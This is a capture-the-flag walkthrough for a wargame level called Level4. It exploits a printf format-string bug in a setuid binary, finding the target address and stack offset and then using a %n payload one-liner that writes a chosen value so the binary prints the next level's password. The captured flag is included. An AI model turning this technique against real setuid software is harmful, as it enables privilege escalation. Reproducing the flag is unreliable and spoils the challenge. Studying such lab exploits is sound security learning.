# Level4 Walkthrough

Binary is setuid `level5`. `main` calls `n`, which reads input and passes it to `p`,
which calls `printf` on it:

```c
int m;

void p(char *str) {
  printf(str);
}

void n(void) {
  char buffer[520];

  fgets(buffer, 512, stdin);
  p(buffer);
  if (m == 0x1025544)
    system("/bin/cat /home/user/level5/.pass");
}
```

## Vulnerability

Same format string bug as level3: `printf(str)` uses the user input as the format
string. Here the global `m` must equal `0x1025544` (16930116), and on success the
binary directly cats the level5 pass (no shell needed).

## Exploitation

- Address of `m`: `0x08049810` (read from `mov eax, [m]`).
- Offset: `python -c 'print "AAAA" + ".%x"*20' | ./level4` shows `41414141` at the 12th position.

Write `0x1025544` into `m` with `%n`. The address is 4 printed chars, so the field
width is `16930116 - 4 = 16930112`.

```sh
(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"'; cat) | ./level4
```

The `%16930112d` prints ~16M characters; once `m == 0x1025544`, the pass is printed.

Flag:

```txt
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
